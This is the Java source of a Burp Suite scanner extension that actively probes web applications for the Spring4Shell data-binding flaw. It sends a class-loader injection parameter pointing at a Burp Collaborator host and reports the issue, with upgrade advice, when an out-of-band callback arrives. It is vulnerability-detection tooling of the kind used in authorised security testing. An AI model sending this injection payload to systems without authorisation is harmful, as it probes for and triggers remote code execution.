package burp;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class BurpExtender implements IBurpExtender,IScannerCheck{

    private PrintWriter stderr;
    private PrintWriter stdout;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private final String name = "Spring4Shell";
    private final String version = "1.0";

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
        callbacks.setExtensionName(name);
        stdout.println(String.format("Plugin: %s\nVersion:%s\nAuthor:Loneyer",name,version));
        stdout.println("https://github.com/Loneyers/Spring4Shell");
        callbacks.registerScannerCheck(this);
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        IExtensionHelpers helpers = callbacks.getHelpers();
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        URL url = reqInfo.getUrl();
        String protocal = url.getProtocol();
        List<IScanIssue> issues = new ArrayList<>();
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
        String injection = "/?class.module.classLoader.resources.context.configFile=https://%s&class.module.classLoader.resources.context.configFile.content.aaa=xxx";
        String finalpayload = String.format(injection,currentCollaboratorPayload);
        try {
            byte[] springtest = helpers.buildHttpRequest(new URL(protocal, url.getHost(), url.getPort(), finalpayload));
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), springtest);
            List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);
            if (!collaboratorInteractions.isEmpty()) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        new IHttpRequestResponse[]{checkRequestResponse},
                        "Spring4Shell",
                        "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.",
                       "High",
                        "Certain",
                        "5.3.x users should upgrade to 5.3.18+, 5.2.x users should upgrade to 5.2.20+."

                ));
                return issues;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

        return issues;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName())) {
            return -1;
        } else {
            return 0;
        }
    }

    class CustomScanIssue implements IScanIssue
    {
        private IHttpService httpService;
        private URL url;
        private IHttpRequestResponse[] httpMessages;
        private String name;
        private String detail;
        private String severity;
        private String confidence;
        private String remedy;

        public CustomScanIssue(
                IHttpService httpService,
                URL url,
                IHttpRequestResponse[] httpMessages,
                String name,
                String detail,
                String severity,
                String confidence,
                String remedy
        )
        {
            this.httpService = httpService;
            this.url = url;
            this.httpMessages = httpMessages;
            this.name = name;
            this.detail = detail;
            this.severity = severity;
            this.confidence = confidence;
            this.remedy = remedy;
        }

        @Override
        public URL getUrl()
        {
            return url;
        }

        @Override
        public String getIssueName()
        {
            return name;
        }

        @Override
        public int getIssueType()
        {
            return 0;
        }

        @Override
        public String getSeverity()
        {
            return severity;
        }

        @Override
        public String getConfidence()
        {
            return confidence;
        }

        @Override
        public String getIssueBackground()
        {
            return null;
        }

        @Override
        public String getRemediationBackground()
        {
            return null;
        }

        @Override
        public String getIssueDetail()
        {
            return detail;
        }

        @Override
        public String getRemediationDetail()
        {
            return remedy;
        }

        @Override
        public IHttpRequestResponse[] getHttpMessages()
        {
            return httpMessages;
        }

        @Override
        public IHttpService getHttpService()
        {
            return httpService;
        }
}
}
